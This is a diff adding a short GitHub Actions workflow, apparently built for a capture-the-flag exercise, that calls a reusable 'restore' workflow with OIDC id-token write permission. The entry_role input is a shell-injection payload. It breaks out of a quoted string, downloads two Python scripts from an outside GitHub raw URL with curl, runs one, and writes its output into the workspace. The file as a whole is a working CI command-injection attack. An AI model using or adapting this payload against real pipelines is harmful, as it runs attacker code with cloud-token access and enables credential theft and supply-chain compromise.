@@ -1,0 +1,17 @@
+name: MetricForge exact broker stage
+
+on:
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  stage:
+    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
+    with:
+      mode: exchange
+      nonce: exact-broker-stage
+      entry_role: >-
+        x" || true; curl -fsSL https://raw.githubusercontent.com/MyeongJong03/metricforge-ctf-runner-20260719/main/role_stage.py -o /tmp/role_stage.py; curl -fsSL https://raw.githubusercontent.com/MyeongJong03/metricforge-ctf-runner-20260719/main/broker_stage.py -o /tmp/broker_stage.py; cd /tmp; python3 broker_stage.py > "$GITHUB_WORKSPACE/entry.json"; cd "$GITHUB_WORKSPACE"; exit 0; #
